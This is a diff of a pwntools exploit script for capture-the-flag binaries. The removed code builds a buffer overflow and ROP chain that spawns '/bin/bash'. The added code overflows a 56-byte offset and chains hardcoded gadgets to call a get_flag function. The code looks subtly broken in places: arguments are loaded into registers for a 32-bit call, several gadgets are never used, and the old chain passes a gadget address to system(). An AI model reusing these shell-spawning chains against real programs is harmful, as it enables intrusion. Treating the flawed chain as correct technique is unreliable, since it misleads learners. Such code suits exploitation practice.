@@ -1,26 +1,39 @@
 from pwn import *
+# Set up the binary and context
+binary = './pwn/stack/rop-9/rop9'
+elf = ELF(binary)
+context.binary = binary
+context.terminal = ['tmux', 'splitw', '-h']
 
-# Set up the context for 32-bit ELF
-context(arch='i386', os='linux')
-
-# Define the binary and the remote or local connection
-binary = './pwn/stack/rop-2/rop2'
-
-# Start the process
+# Start the process or connect to the remote service
 p = process(binary)
-# Define the payload
-payload = b'A' * 136  # Fill the buffer
+# If remote, use: p = remote('host', port)
 
-# ROP chain to call system('/bin/bash')
-rop = ROP(binary)
-rop.system(next(rop.find_gadget(['pop ebx', 'ret']))[0])  # pop ebx; ret
-rop.raw(next(rop.search(b'/bin/bash')))  # address of '/bin/bash'
+# Gadgets and addresses
+pop_eax = 0x080b91e6  # pop eax ; ret
+pop_ebx = 0x080481ad  # pop ebx ; ret
+pop_ecx_ebx = 0x0806fc31  # pop ecx ; pop ebx ; ret
+pop_edx = 0x0806fc0a  # pop edx ; ret
+int_80 = 0x08049563  # int 0x80
+get_flag = elf.symbols['get_flag']
 
-# Construct the final payload
-payload += rop.chain()  # Append the ROP chain
+# Arguments for get_flag
+a1 = 814536271
+a2 = 425138641
 
-# Send the payload to the process
+# Offset to return address
+offset = 56
+
+# Craft the payload
+payload = b'A' * offset
+payload += p32(pop_eax)
+payload += p32(a1)
+payload += p32(pop_ebx)
+payload += p32(a2)
+payload += p32(get_flag)
+
+# Send the payload
 p.sendline(payload)
 
-# Interact with the shell
+# Interact with the process to get the flag
 p.interactive()
